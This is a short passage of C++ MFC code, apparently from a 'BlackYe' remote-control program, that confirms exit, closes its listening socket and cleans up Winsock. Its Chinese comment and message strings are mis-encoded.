	// TODO: �ڴ���������������
	if (IDYES == ::MessageBox(this->GetSafeHwnd(), _T("��ȷ��Ҫ�˳�BlackYeԶ�̿��������?"), _T("�˳�����"), MB_YESNO | MB_ICONWARNING))
	{
		if (NULL != m_pMsgWindow)
		{
			delete[] m_pMsgWindow;
		}
		::closesocket(m_ListenSocket);
		::WSACleanup();
	}
	else
	{
		return;
	}
	CDialog::DestroyWindow();
}
